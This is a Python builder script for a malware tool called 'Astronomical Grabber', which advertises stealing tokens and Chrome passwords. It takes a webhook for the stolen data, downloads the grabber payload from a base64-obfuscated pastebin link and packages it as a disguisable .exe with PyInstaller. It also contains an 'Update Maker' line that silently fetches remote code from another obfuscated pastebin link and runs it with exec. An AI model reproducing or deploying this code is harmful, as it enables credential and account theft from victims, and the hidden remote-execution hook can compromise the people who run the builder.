from os import system
system("pip install -r requierments.txt")
system("cls")
import os
import time
import requests
import base64
import shutil
from colorama import Fore, Style

settings=" "

#Update Maker (Updates Astronomical Grabber if there is an update)
exec(requests.get(base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3daWHRQWmdx').decode("utf-8")).text)

#Cool Animation :>
system("cls")
print(f'''{Style.BRIGHT}{Fore.BLUE}
 ▄▀▀█▄   ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀█▄   ▄▀▀▀▀▄         
▐ ▄▀ ▀▄ █ █   ▐ █    █  ▐ █   █   █ █      █ █  █ █ █ █      █ █  █ ▀  █ █   █  █  █ █    ▌ ▐ ▄▀ ▀▄ █    █          
  █▄▄▄█    ▀▄   ▐   █     ▐  █▀▀█▀  █      █ ▐  █  ▀█ █      █ ▐  █    █ ▐   █  ▐  ▐ █        █▄▄▄█ ▐    █          
 ▄▀   █ ▀▄   █     █       ▄▀    █  ▀▄    ▄▀   █   █  ▀▄    ▄▀   █    █      █       █       ▄▀   █     █           
█   ▄▀   █▀▀▀    ▄▀       █     █     ▀▀▀▀   ▄▀   █     ▀▀▀▀   ▄▀   ▄▀    ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀ █   ▄▀    ▄▀▄▄▄▄▄▄▀     
▐   ▐    ▐      █         ▐     ▐            █    ▐            █    █    █       █ █     ▐  ▐   ▐     █             
                ▐                            ▐                 ▐    ▐    ▐       ▐ ▐                  ▐            

 ▄▀▀▀▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄                                                   
█         █   █   █ ▐ ▄▀ ▀▄ ▐ ▄▀   █ ▐ ▄▀   █ ▐  ▄▀   ▐ █   █   █                                                   
█    ▀▄▄  ▐  █▀▀█▀    █▄▄▄█   █▄▄▄▀    █▄▄▄▀    █▄▄▄▄▄  ▐  █▀▀█▀                                                    
█     █ █  ▄▀    █   ▄▀   █   █   █    █   █    █    ▌   ▄▀    █                                                    
▐▀▄▄▄▄▀ ▐ █     █   █   ▄▀   ▄▀▄▄▄▀   ▄▀▄▄▄▀   ▄▀▄▄▄▄   █     █                                                     
▐         ▐     ▐   ▐   ▐   █    ▐   █    ▐    █    ▐   ▐     ▐                                                     
                            ▐        ▐         ▐             
''')
time.sleep(1)
system("cls")
print(f'''{Style.BRIGHT}{Fore.MAGENTA}
 ▄▀▀█▄   ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀█▄   ▄▀▀▀▀▄         
▐ ▄▀ ▀▄ █ █   ▐ █    █  ▐ █   █   █ █      █ █  █ █ █ █      █ █  █ ▀  █ █   █  █  █ █    ▌ ▐ ▄▀ ▀▄ █    █          
  █▄▄▄█    ▀▄   ▐   █     ▐  █▀▀█▀  █      █ ▐  █  ▀█ █      █ ▐  █    █ ▐   █  ▐  ▐ █        █▄▄▄█ ▐    █          
 ▄▀   █ ▀▄   █     █       ▄▀    █  ▀▄    ▄▀   █   █  ▀▄    ▄▀   █    █      █       █       ▄▀   █     █           
█   ▄▀   █▀▀▀    ▄▀       █     █     ▀▀▀▀   ▄▀   █     ▀▀▀▀   ▄▀   ▄▀    ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀ █   ▄▀    ▄▀▄▄▄▄▄▄▀     
▐   ▐    ▐      █         ▐     ▐            █    ▐            █    █    █       █ █     ▐  ▐   ▐     █             
                ▐                            ▐                 ▐    ▐    ▐       ▐ ▐                  ▐            

 ▄▀▀▀▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄                                                   
█         █   █   █ ▐ ▄▀ ▀▄ ▐ ▄▀   █ ▐ ▄▀   █ ▐  ▄▀   ▐ █   █   █                                                   
█    ▀▄▄  ▐  █▀▀█▀    █▄▄▄█   █▄▄▄▀    █▄▄▄▀    █▄▄▄▄▄  ▐  █▀▀█▀                                                    
█     █ █  ▄▀    █   ▄▀   █   █   █    █   █    █    ▌   ▄▀    █                                                    
▐▀▄▄▄▄▀ ▐ █     █   █   ▄▀   ▄▀▄▄▄▀   ▄▀▄▄▄▀   ▄▀▄▄▄▄   █     █                                                     
▐         ▐     ▐   ▐   ▐   █    ▐   █    ▐    █    ▐   ▐     ▐                                                     
                            ▐        ▐         ▐             
''')
time.sleep(1)
system("cls")
print(f'''{Style.BRIGHT}{Fore.GREEN}
 ▄▀▀█▄   ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀█▄   ▄▀▀▀▀▄         
▐ ▄▀ ▀▄ █ █   ▐ █    █  ▐ █   █   █ █      █ █  █ █ █ █      █ █  █ ▀  █ █   █  █  █ █    ▌ ▐ ▄▀ ▀▄ █    █          
  █▄▄▄█    ▀▄   ▐   █     ▐  █▀▀█▀  █      █ ▐  █  ▀█ █      █ ▐  █    █ ▐   █  ▐  ▐ █        █▄▄▄█ ▐    █          
 ▄▀   █ ▀▄   █     █       ▄▀    █  ▀▄    ▄▀   █   █  ▀▄    ▄▀   █    █      █       █       ▄▀   █     █           
█   ▄▀   █▀▀▀    ▄▀       █     █     ▀▀▀▀   ▄▀   █     ▀▀▀▀   ▄▀   ▄▀    ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀ █   ▄▀    ▄▀▄▄▄▄▄▄▀     
▐   ▐    ▐      █         ▐     ▐            █    ▐            █    █    █       █ █     ▐  ▐   ▐     █             
                ▐                            ▐                 ▐    ▐    ▐       ▐ ▐                  ▐            

 ▄▀▀▀▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄                                                   
█         █   █   █ ▐ ▄▀ ▀▄ ▐ ▄▀   █ ▐ ▄▀   █ ▐  ▄▀   ▐ █   █   █                                                   
█    ▀▄▄  ▐  █▀▀█▀    █▄▄▄█   █▄▄▄▀    █▄▄▄▀    █▄▄▄▄▄  ▐  █▀▀█▀                                                    
█     █ █  ▄▀    █   ▄▀   █   █   █    █   █    █    ▌   ▄▀    █                                                    
▐▀▄▄▄▄▀ ▐ █     █   █   ▄▀   ▄▀▄▄▄▀   ▄▀▄▄▄▀   ▄▀▄▄▄▄   █     █                                                     
▐         ▐     ▐   ▐   ▐   █    ▐   █    ▐    █    ▐   ▐     ▐                                                     
                            ▐        ▐         ▐                                                                     

{Style.BRIGHT}{Fore.RED} 1 > {Style.NORMAL}{Fore.WHITE}Steals Tokens {Fore.GREEN}:: {Style.NORMAL}{Fore.WHITE}Yes
{Style.BRIGHT}{Fore.RED} 2 > {Style.NORMAL}{Fore.WHITE}Gets Chrome Passwords {Fore.GREEN}:: {Style.NORMAL}{Fore.WHITE}Yes
{Style.BRIGHT}{Fore.RED} 3 > {Style.NORMAL}{Fore.WHITE}Add own Code {Fore.GREEN}:: {Style.NORMAL}{Fore.WHITE}Yes
{Style.BRIGHT}{Fore.RED} 4 > {Style.NORMAL}{Fore.WHITE}Easy to use {Fore.GREEN}:: {Style.NORMAL}{Fore.WHITE}Yes

PS: Pyinstaller must be installed check it by Typing this into the cmd: pyinstaller''')

#Input and stuff
WebHook=input(f"\n{Style.BRIGHT}{Fore.BLUE}> Webhook: {Style.NORMAL}{Fore.WHITE}")
addcode=input(f"{Style.BRIGHT}{Fore.BLUE}Do you want to add python code to the Grabber else it will open grab the stuff and close. y/n? {Style.NORMAL}{Fore.WHITE}")

#File Settings
print("\n\nSettings for the Grabber.exe:\n")
settings=settings+'--icon "'+input("File Icon Path (must be .ico file, C:\\anydirectoryname\\anyfilename.ico): ")+'"'
settings=settings+' --name "'+input("File name: ")+'"'

#Added code
if addcode=="y":
    path=input("Path to the code you want to add (C:\\anydirectoryname\\anyfilename.py): ")
    with open(f"{path}", "r") as file:
      addjust="\n"+file.read()
elif addcode=="n":
    addjust=""
else:
  addjust=""
  print(f"{Style.BRIGHT}{Fore.RED}Invalid Input No code adjusted (skipping){Style.NORMAL}{Fore.WHITE}\n\n")

#Grabber Builder
try:
    os.mkdir("grabber")
except:
  pass

with open('grabber\\grabber.py', 'w') as file:
    file.writelines(f"webhook='{WebHook}'\n"+requests.get(base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2pzbjdDUmZV').decode("utf-8")).text + addjust)
    file.close()


system(f'pyinstaller grabber\\grabber.py{settings} --noconfirm --workpath="./grabber" --onefile')
system("del *.spec")
shutil.rmtree('grabber')
try:
  shutil.rmtree('config')
except:
  pass

#End
print(f"{Fore.RED}------------------------------------------\nThe .exe works just like a normal python file so if you have a ./images folder for something like a game you just need to put it into the same folder as the .exe!\nYour grabber.exe is in the ./dist/grabber.exe folder! If theres no error.\n\n------------------------------------------")
print("\nYou can close this Programm now!")
time.sleep(1000)
